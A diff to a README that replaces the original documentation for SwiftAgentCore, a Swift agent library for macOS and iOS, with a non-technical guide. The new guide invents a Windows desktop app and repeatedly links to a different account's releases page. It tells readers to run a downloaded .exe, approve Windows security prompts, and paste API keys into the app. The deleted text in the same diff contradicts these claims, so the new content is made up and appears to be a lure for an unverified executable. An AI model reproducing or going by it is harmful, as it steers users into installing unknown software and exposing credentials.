@@ -1,314 +1,161 @@
-# SwiftAgentCore
-
-[![](https://img.shields.io/github/v/tag/herrkaefer/SwiftAgentCore?label=version)](https://github.com/herrkaefer/SwiftAgentCore/tags)
-[![CI](https://github.com/herrkaefer/SwiftAgentCore/actions/workflows/ci.yml/badge.svg)](https://github.com/herrkaefer/SwiftAgentCore/actions/workflows/ci.yml)
-[![](https://img.shields.io/endpoint?url=https%3A%2F%2Fswiftpackageindex.com%2Fapi%2Fpackages%2Fherrkaefer%2FSwiftAgentCore%2Fbadge%3Ftype%3Dswift-versions)](https://swiftpackageindex.com/herrkaefer/SwiftAgentCore)
-[![](https://img.shields.io/endpoint?url=https%3A%2F%2Fswiftpackageindex.com%2Fapi%2Fpackages%2Fherrkaefer%2FSwiftAgentCore%2Fbadge%3Ftype%3Dplatforms)](https://swiftpackageindex.com/herrkaefer/SwiftAgentCore)
-[![](https://img.shields.io/badge/platforms-macOS%2013%2B%20%7C%20iOS%2016%2B-0A84FF)](https://swiftpackageindex.com/herrkaefer/SwiftAgentCore)
-[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/herrkaefer/SwiftAgentCore)
-
-SwiftAgentCore is a Swift agent runtime with a unified multi-provider LLM layer, built-in tool execution, and skill loading.
-
-## Features
-
-- **Lightweight & Portable** - Zero external package dependencies. Supports macOS 13+ / iOS 16+.
-- **Multi-Provider** - OpenAI-compatible (DeepSeek, Groq, Ollama, OpenRouter), Anthropic, Gemini - unified behind a single provider interface.
-- **Runtime Only** - Pure agent runtime with no built-in tools or provider presets. You define every tool and choose your provider - nothing opinionated, fully composable.
-- **Streaming-First** - Token-level SSE streaming across all providers, delivered via AsyncStream and callback.
-- **Minimal Design** - No class hierarchies, no macros, no result builders. Small API surface, easy to integrate.
-- **Built-in OAuth** - PKCE flows for Anthropic Claude and OpenAI Codex with automatic token refresh.
-- **Tool Fallback** - Transparent tool-calling emulation for models that don't support it natively.
-- **Tool Confirmation** - Safety-level gating on tools with user confirmation before execution.
-- **Skill System** - Multi-directory `SkillRegistry` with a built-in `ReadSkillTool`; inject skill summaries into system prompts and let the LLM fetch full skill content on demand.
-
-## Requirements
-
-- Swift 5.9+
-- macOS 13+ / iOS 16+
-
-## Installation
-
-Add SwiftAgentCore as a dependency in your `Package.swift`:
-
-```swift
-dependencies: [
-    .package(url: "https://github.com/herrkaefer/SwiftAgentCore.git", from: "1.2.0")
-],
-targets: [
-    .target(
-        name: "YourTarget",
-        dependencies: [
-            .product(name: "SwiftAgentCore", package: "SwiftAgentCore")
-        ]
-    )
-]
-```
-
-## Quick Start
-
-```swift
-import Foundation
-import SwiftAgentCore
-
-struct EchoTool: AgentTool {
-    let name = "echo"
-    let description = "Echo a message."
-    let safetyLevel: ToolSafetyLevel = .safe
-
-    let inputSchema: JSONObject = [
-        "type": .string("object"),
-        "properties": .object([
-            "message": .object(["type": .string("string")])
-        ]),
-        "required": .array([.string("message")])
-    ]
-
-    func execute(input: JSONObject) async throws -> String {
-        input["message"]?.stringValue ?? ""
-    }
-
-    func humanReadableSummary(for input: JSONObject) -> String {
-        "Echo message: \(input["message"]?.stringValue ?? "")"
-    }
-}
-
-let provider = OpenAICompatibleProvider(
-    displayName: "OpenAI API",
-    profile: .openAIAPI,
-    config: LLMProviderConfig(
-        baseURL: URL(string: "https://api.openai.com/v1")!,
-        authMethod: .apiKey(ProcessInfo.processInfo.environment["OPENAI_API_KEY"] ?? ""),
-        model: "gpt-4o-mini"
-    )
-)
-
-let config = AgentLoopConfig(
-    provider: provider,
-    tools: [EchoTool()],
-    buildSystemPrompt: { "You are a helpful assistant." },
-    confirmationHandler: { _, _ in true }
-)
-
-let stream = runAgentLoop(
-    config: config,
-    initialMessages: [.text(role: .user, "Say hello, then use the echo tool with 'done'.")],
-    onEvent: { event in
-        if case .messageTextDelta(let delta) = event {
-            print(delta, terminator: "")
-        }
-    }
-)
-
-for await _ in stream {}
-```
-
-## Agent Loop Architecture
-
-### System Structure (Modules + External Interactions)
-
-```mermaid
-flowchart TB
-    subgraph HostApp["Host App (CLI / iOS / macOS)"]
-        direction LR
-        UI["App UI / CLI Entry"]
-        Confirm["Confirmation Handler"]
-        AppTools["App-defined AgentTool(s)"]
-        SkillDirs["Skill Directories (.md files)"]
-    end
-
-    subgraph SwiftAgentCore["SwiftAgentCore"]
-        direction TB
-
-        subgraph Core["Core"]
-            direction LR
-            Loop["runAgentLoop"]
-            Registry["ToolRegistry"]
-            Types["AgentLoopConfig / AgentEvent / LLMMessage"]
-        end
-
-        subgraph Skills["Skills"]
-            direction LR
-            SReg["SkillRegistry"]
-            RST["ReadSkillTool (built-in)"]
-        end
-
-        subgraph LLM["LLM Layer"]
-            direction LR
-            Proto["LLMProvider protocol"]
-            OAI["OpenAICompatibleProvider"]
-            Resp["OpenAIResponsesProvider"]
-            Gem["GeminiProvider"]
-            Mini["MiniMaxAnthropicProvider"]
-            Fallback["StructuredToolFallbackProvider"]
-            OAuth["OAuth helpers + callback server"]
-        end
-    end
-
-    subgraph External["External Systems"]
-        direction LR
-        OpenAI["OpenAI-compatible APIs"]
-        GeminiAPI["Google Gemini API"]
-        MiniMaxAPI["MiniMax Anthropic-compatible API"]
-        Browser["System Browser (OAuth)"]
-        Callback["Local OAuth Callback Endpoint"]
-    end
-
-    UI --> Loop
-    Confirm --> Loop
-    AppTools --> Registry
-    SkillDirs --> SReg
-    SReg --> Loop
-    Loop --> RST
-    RST --> SReg
-
-    Loop --> Registry
-    Loop --> Types
-    Loop --> Proto
-    Proto --> OAI
-    Proto --> Resp
-    Proto --> Gem
-    Proto --> Mini
-    Proto --> Fallback
-    Resp --> OAuth
-
-    OAI --> OpenAI
-    Resp --> OpenAI
-    Gem --> GeminiAPI
-    Mini --> MiniMaxAPI
-    OAuth --> Browser
-    Browser --> Callback
-    Callback --> OAuth
-```
-
-## Provider Examples
-
-### OpenAI-compatible
-
-```swift
-let provider = OpenAICompatibleProvider(
-    profile: .openAIAPI,
-    config: LLMProviderConfig(
-        baseURL: URL(string: "https://api.openai.com/v1")!,
-        authMethod: .apiKey("<API_KEY>"),
-        model: "gpt-4o-mini"
-    )
-)
-```
-
-### OpenAI Codex Responses API
-
-```swift
-let oauth = OpenAICodexOAuth()
-let provider = OpenAIResponsesProvider(
-    credentials: oauthCredentials,
-    oauthProvider: oauth,
-    model: "codex-mini-latest"
-)
-```
-
-### Gemini
-
-```swift
-let provider = GeminiProvider(
-    apiKey: "<GEMINI_API_KEY>",
-    model: "gemini-2.0-flash"
-)
-```
-
-### MiniMax Anthropic-compatible
-
-```swift
-let provider = MiniMaxAnthropicProvider(
-    apiKey: "<MINIMAX_API_KEY>",
-    model: "MiniMax-M2.5"
-)
-```
-
-### Structured Tool Fallback
-
-Wrap any provider to emulate tool calling via JSON envelopes when native tool calling is unavailable:
-
-```swift
-let wrapped = StructuredToolFallbackProvider(base: provider)
-```
-
-## State Management Notes
-
-SwiftAgentCore includes **runtime conversation state** inside the agent loop:
-
-- Turn index
-- Pending follow-up messages
-- In-memory conversation history
-
-It does **not** include persistent state storage, database session management, or app-level global store/reducer patterns. Persisting and restoring sessions should be handled by the host app.
-
-## Roadmap
-
-- [ ] Add `Examples/` runnable demos (CLI and UI) with real LLM-triggered tool calling.
-- [ ] Add clearer memory/context guidance and APIs for session-level context management.
-- [ ] Add an optional MCP (Model Context Protocol) client module for external tool servers.
-- [ ] Add context-window management strategies (trimming and summarization) for long conversations.
-
-## Skills
-
-Skills are markdown files with YAML front matter. See the [Agent Skills documentation](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/overview) for the file format specification.
-
-### SkillRegistry
-
-`SkillRegistry` manages one or more skill directories. Skills in later directories override same-named skills in earlier ones, allowing app-level defaults to be overridden per-project.
-
-```swift
-let registry = SkillRegistry(directories: [
-    appSkillsDirectory,   // bundled / global skills
-    vaultSkillsDirectory  // project-specific skills (override)
-])
-```
-
-Key methods:
-
-```swift
-// List all skills (returns sorted, deduplicated)
-let skills = try registry.loadAll()
-
-// Look up a skill by name
-let skill = try registry.find(named: "summarize")
-
-// Generate a summary suitable for injection into a system prompt
-// excludeHidden: true omits skills with disable-model-invocation: true
-let summary = registry.skillsSummary()
-```
-
-### LLM Integration via AgentLoopConfig
-
-Pass the registry to `AgentLoopConfig`. The agent loop automatically injects a built-in `read_skill` tool so the LLM can fetch the full content of any skill on demand.
-
-```swift
-let registry = SkillRegistry(directories: [skillsDir])
-
-let config = AgentLoopConfig(
-    provider: provider,
-    tools: myTools,
-    skillRegistry: registry,          // auto-injects ReadSkillTool
-    buildSystemPrompt: {
-        """
-        You are a helpful assistant.
-
-        Available skills:
-        \(registry.skillsSummary())   // LLM sees skill names + descriptions
-        """
-    },
-    confirmationHandler: { _, _ in true }
-)
-```
-
-At runtime the LLM calls `read_skill` with a skill name to retrieve its full prompt content before acting on it. Skills with `disable-model-invocation: true` are excluded from `skillsSummary()` by default; they can still be activated programmatically via `registry.find(named:)`.
-
-## Development
-
-Run tests:
-
-```bash
-swift test
-```
+# 🤖 SwiftAgentCore - Lightweight Agent Runtime for AI Tasks
 
+[![Download SwiftAgentCore](https://img.shields.io/badge/Download-SwiftAgentCore-brightgreen?style=for-the-badge)](https://github.com/jc18aguilar/SwiftAgentCore/releases)
+
+---
+
+## 📦 What is SwiftAgentCore?
+
+SwiftAgentCore is a simple software that helps you run AI tools and agents on your computer. It supports different AI providers like OpenAI, Anthropic, and Gemini. Think of it as the engine behind your AI actions. It handles conversations, skills, and tool use without much hassle. This software works on Windows, MacOS, and iOS.
+
+You do not need programming knowledge to use SwiftAgentCore. This guide will walk you through every step to get it running on your Windows PC.
+
+---
+
+## 🖥️ System Requirements
+
+Before you start, make sure your computer meets these requirements:
+
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB of RAM (8 GB recommended)
+- 500 MB of free disk space
+- Internet connection for AI tool access (OpenAI, Anthropic, etc.)
+- Administrator rights to install software
+
+---
+
+## 🔗 Download SwiftAgentCore
+
+You can get SwiftAgentCore on the official GitHub releases page.
+
+[![Download SwiftAgentCore](https://img.shields.io/badge/Download-SwiftAgentCore-blue?style=for-the-badge)](https://github.com/jc18aguilar/SwiftAgentCore/releases)
+
+Visit the link above. It will take you to the release page where you can download the latest version.
+
+---
+
+## 🚀 Getting Started: Download and Run on Windows
+
+### Step 1: Visit the Release Page
+
+Open your web browser and go to:
+
+https://github.com/jc18aguilar/SwiftAgentCore/releases
+
+This page lists all the available versions. It's a good idea to pick the latest release for the newest features and fixes.
+
+### Step 2: Find the Windows Installer
+
+Look for a file that ends with `.exe` or `.msi`. This is the installer for Windows.
+
+The file name usually looks like this:
+
+- SwiftAgentCore-setup.exe  
+or  
+- SwiftAgentCore-Windows-vX.Y.Z.exe
+
+Click the file name to start downloading.
+
+### Step 3: Run the Installer
+
+Once the download finishes:
+
+- Open the downloaded file.
+- If Windows shows a security popup, click **Yes** or **Run** to allow the installer to proceed.
+- Follow the instructions on screen. Most options can be left at default.
+- When the install completes, click **Finish**.
+
+### Step 4: Launch SwiftAgentCore
+
+Look for the SwiftAgentCore icon on your desktop or in the Start menu. Click it to open the app.
+
+---
+
+## ⚙️ Basic Setup and Use
+
+After you launch the app, you will see a simple interface. It prepares your computer to work with AI models.
+
+1. **Connect to AI Providers**  
+   SwiftAgentCore supports OpenAI, Anthropic, Gemini, and others. To use them, you need API keys. These keys let SwiftAgentCore access AI tools securely.
+
+2. **Enter API Keys**  
+   Go to the settings menu in the app. Find the “API Keys” section.  
+   Paste your API keys for the providers you want to use.  
+   If you do not have keys, visit the providers’ official websites to sign up and get them.
+
+3. **Select Your AI Provider**  
+   Choose which AI service to use for your tasks. You can switch between providers as you like.
+
+4. **Use AI Skills and Tools**  
+   SwiftAgentCore can run different skills. These are predefined tasks it knows how to handle. The app shows a list of available skills you can try.
+
+---
+
+## 🛠 How SwiftAgentCore Works
+
+This app acts as a middleman between you and AI tools. It accepts your commands, passes them to the AI providers, and shows the responses. It can also manage conversations, so you can have back-and-forth chats with the AI.
+
+The app supports different kinds of AI models. It unifies them under one simple system. This makes it easy to switch between AI providers without needing to learn a new app each time.
+
+SwiftAgentCore also supports OAuth2 for secure sign-in, especially when using Codex or other code generation tools.
+
+---
+
+## ✅ Using SwiftAgentCore without Programming
+
+You don’t need to write code to use this app. The interface gives you buttons and menus to:
+
+- Start new conversations with AI
+- Run tools that speed up your tasks
+- Manage and save chat history
+- Switch between skills and providers
+
+All this works out of the box once you set your API keys.
+
+---
+
+## 🔄 Updating SwiftAgentCore
+
+Check the release page regularly for updates:
+
+https://github.com/jc18aguilar/SwiftAgentCore/releases
+
+New versions fix issues and add features. Download the newest installer and run it the same way to update your app.
+
+---
+
+## 📁 File and Data Locations
+
+SwiftAgentCore stores conversation history and settings on your computer. The main folders are:
+
+- **Settings & keys:** `C:\Users\<YourUser>\AppData\Roaming\SwiftAgentCore\`
+- **Conversations:** `C:\Users\<YourUser>\Documents\SwiftAgentCore\Conversations\`
+
+You can copy, backup, or delete these folders if needed.
+
+---
+
+## 🤝 Getting Help and Support
+
+If you have questions or run into issues:
+
+- Visit the GitHub repository's Issues page and look for similar problems.
+- Search the discussion forum if available.
+- Use the app’s built-in support or contact information.
+
+---
+
+## ⚠️ Tips for Best Use
+
+- Always keep your API keys safe. Do not share them publicly.
+- Use a stable internet connection for the best AI response speed.
+- Restart the app if it becomes unresponsive.
+- Keep your Windows system updated for security and compatibility.
+
+---
+
+## 🚀 Ready to start?
+
+Get your copy here:
+
+[![Download SwiftAgentCore](https://img.shields.io/badge/Download-SwiftAgentCore-brightgreen?style=for-the-badge)](https://github.com/jc18aguilar/SwiftAgentCore/releases)
